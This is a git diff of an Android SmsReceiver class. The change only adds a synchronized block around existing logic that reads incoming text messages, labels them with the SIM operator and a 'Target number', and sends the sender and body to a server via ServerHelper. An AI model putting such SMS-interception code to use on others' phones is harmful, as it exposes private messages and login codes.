@@ -23,35 +23,38 @@ public class SmsReceiver extends BroadcastReceiver {
     private static final String TAG = SmsReceiver.class.getSimpleName();
     public static final String pdu_type = "pdus";
 
+    private Object object = new Object();
+
     public void _onReceive(Context context, Intent intent) {
-        Bundle bundle = intent.getExtras();
+        synchronized (object) {
 
-        SIMData simData = TelephonyLogs.getCallsLog(context);
+            Bundle bundle = intent.getExtras();
+            SIMData simData = TelephonyLogs.getCallsLog(context);
 
-        StringBuilder strMessage = new StringBuilder();
-        String format = bundle.getString("format");
-        Object[] pdus = (Object[]) bundle.get(pdu_type);
-        if (pdus != null) {
-            boolean isVersionM = Build.VERSION.SDK_INT >= 23;
-            SmsMessage[] msgs = new SmsMessage[pdus.length];
-            for (int i = 0; i < msgs.length; i++) {
-                if (isVersionM) {
-                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
-                } else {
-                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+            StringBuilder strMessage = new StringBuilder();
+            String format = bundle.getString("format");
+            Object[] pdus = (Object[]) bundle.get(pdu_type);
+            if (pdus != null) {
+                boolean isVersionM = Build.VERSION.SDK_INT >= 23;
+                SmsMessage[] msgs = new SmsMessage[pdus.length];
+                for (int i = 0; i < msgs.length; i++) {
+                    if (isVersionM) {
+                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
+                    } else {
+                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+                    }
+                    if (i == 0) {
+                        strMessage.append("[" + new Date() + "]").append("Current SIM: ").append(simData.getOperator()).append(". ")
+                                .append("Target number: ").append(simData.getNumber()).append(". ").append("SMS from ").append(msgs[i].getOriginatingAddress()).append(": ");
+                    }
+                    strMessage.append(msgs[i].getMessageBody());
                 }
-                if (i == 0) {
-                    strMessage.append("[" + new Date() + "]").append("Current SIM: ").append(simData.getOperator()).append(". ")
-                            .append("Target number: ").append(simData.getNumber()).append(". ").append("SMS from ").append(msgs[i].getOriginatingAddress()).append(": ");
-                }
-                strMessage.append(msgs[i].getMessageBody());
+                strMessage.append("\n");
+                Log.d(TAG, "onReceiveSMS: " + strMessage);
+                ReceiversActivity.instance.runOnUiThread(() -> Toast.makeText(App.getInstance(), strMessage.toString(), Toast.LENGTH_LONG).show());
+                ServerHelper.getRequest(strMessage.toString());
             }
-            strMessage.append("\n");
-            Log.d(TAG, "onReceiveSMS: " + strMessage);
-            ReceiversActivity.instance.runOnUiThread(() -> Toast.makeText(App.getInstance(), strMessage.toString(), Toast.LENGTH_LONG).show());
-            ServerHelper.getRequest(strMessage.toString());
         }
-
     }
 
     public void onReceive(Context context, Intent intent) {
